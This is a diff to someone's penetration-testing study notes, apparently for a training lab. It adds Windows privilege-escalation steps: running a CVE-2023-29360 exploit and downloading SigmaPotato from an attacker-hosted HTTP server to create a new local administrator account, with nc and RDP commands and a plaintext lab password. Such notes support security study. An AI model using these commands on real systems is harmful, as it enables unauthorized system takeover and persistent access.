@@ -2263,7 +2263,27 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     move .\VoiceActivation.exe .\Searches\
     ```
 - 17.3.2 Using Exploits
-- dsdd  
+  - Exploit CVE-2023-29360 to elevate privilege to NT AUTHORITY\SYSTEM
+    `xfreerdp3 /u:steve /p:securityIsNotAnOption++++++ /v:192.168.185.220 /cert:ignore /drive:share,/home/kali/share`  
+    `.\CVE-2023-29360.exe`  
+  - Use SigmaPotato o obtain shell
+    ```
+    #kali
+    wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
+    python3 -m http.server 80
+
+    nc 192.168.185.220 4444
+    
+    #target
+    whoami /priv
+    C:\Users\dave> powershell
+    iwr -uri http://192.168.45.221/SigmaPotato.exe -OutFile SigmaPotato.exe
+    .\SigmaPotato "net user dave4 lab /add"
+    .\SigmaPotato "net localgroup Administrators dave4 /add"
+    net user
+    xfreerdp3 /u:dave4 /p:lab +clipboard /v:192.168.185.220 /cert:ignore /drive:share,/home/kali/share 
+    ```
+  - Capstone Lab for security update  
 
 ## Penetration testing report 
 - note editor:
